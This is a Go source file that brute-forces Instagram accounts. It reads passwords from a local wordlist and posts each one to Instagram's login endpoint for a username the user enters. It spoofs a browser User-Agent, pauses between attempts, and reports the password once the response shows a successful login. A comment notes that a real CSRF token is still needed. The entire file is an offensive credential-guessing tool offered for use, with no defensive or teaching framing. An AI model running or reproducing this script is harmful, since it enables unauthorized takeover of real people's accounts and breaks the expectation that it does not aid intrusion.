package main

import (
    "bufio"
    "fmt"
    "io"
    "net/http"
    "net/url"
    "os"
    "strings"
    "time"
)

func tryPassword(username, password string) bool {
    loginURL := "https://www.instagram.com/accounts/login/ajax/"
    data := url.Values{}
    data.Set("username", username)
    data.Set("enc_password", fmt.Sprintf("#PWD_INSTAGRAM_BROWSER:0:&:%s", password))
    data.Set("queryParams", "{}")
    data.Set("optIntoOneTap", "false")

    client := &http.Client{}
    req, err := http.NewRequest("POST", loginURL, strings.NewReader(data.Encode()))
    if err != nil {
        fmt.Println("Error creating request:", err)
        return false
    }

    req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36")
    req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
    req.Header.Set("X-CSRFToken", "dummy") // مقدار واقعی نیاز است

    resp, err := client.Do(req)
    if err != nil {
        fmt.Println("Error sending request:", err)
        return false
    }
    defer resp.Body.Close()

    bodyBytes, err := io.ReadAll(resp.Body)
    if err != nil {
        fmt.Println("Error reading response:", err)
        return false
    }
    body := string(bodyBytes)
        fmt.Println("Trying password:", password)
        fmt.Println("Response status:", resp.StatusCode)
        fmt.Println("Response body:", body)
//adeddd
    if resp.StatusCode == 200 && strings.Contains(body, `"authenticated":true`) {
        return true
    }
    return false
}

func main() {
    fmt.Print("Enter username: ")
    var username string
    fmt.Scanln(&username)

    file, err := os.Open("password.txt")
    if err != nil {
        fmt.Println("Error opening passwords file:", err)
        return
    }
    defer file.Close()

    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        password := scanner.Text()
        fmt.Println("Trying password:", password)
        if tryPassword(username, password) {
            fmt.Println("Password found:", password)
            break
        }
        time.Sleep(2 * time.Second)
    }

    if err := scanner.Err(); err != nil {
        fmt.Println("Error reading passwords file:", err)
    }
}
